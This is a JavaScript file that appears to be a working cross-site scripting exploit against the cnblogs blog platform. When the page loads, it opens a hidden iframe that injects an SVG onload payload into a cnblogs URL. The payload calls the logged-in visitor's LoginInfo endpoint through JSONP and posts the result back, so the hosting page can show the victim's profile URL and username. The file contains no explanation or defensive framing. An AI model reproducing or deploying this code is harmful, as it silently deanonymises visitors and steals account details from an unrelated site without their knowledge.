// 个人主页   用户名

function n(t) {
  if ('cnblogs' === t.data.source) {
    var n = t.data.d,
      a = /href="(http:\/\/home\.cnblogs\.com\/u\/.+?)">(.+?)<\/a>/.exec(n)
    if (a) {
      var o = { valid: !0, data: { home: a[1], username: a[2] } }
      let innerHTML = `
      <div class='item'>
        <p class='title'>cnblogs</p>
        <p>个人主页: ${o.data.home}</p>
        <p>用户名: ${o.data.username}</p>
      </div>
    `
      let dom = document.createElement('div')
      dom.innerHTML = innerHTML

      document.getElementById('content').appendChild(dom)
      console.log(o)
    }
  }
}
function cnblogs() {
  var e = document.createElement('iframe')
  e.src =
    'https://wz.cnblogs.com/create?t=xxxx&u="><svg/onload=eval(name)>&c=&i=0'
  e.width = 0
  e.height = 0
  e.style.borderWidth = 0
  e.name =
    "\n   window.test = function(data) {let s = {source: 'cnblogs', d: data}; window.parent.postMessage(s, '*');}\n  let s = document.createElement(\"script\");\n  s.src = 'https://passport.cnblogs.com/user/LoginInfo?callback=test'\n  document.documentElement.appendChild(s);\n  "
  document.documentElement.appendChild(e)
}
window.addEventListener('message', n, !1)
// window.addEventListener('load', function () {
cnblogs()
// })
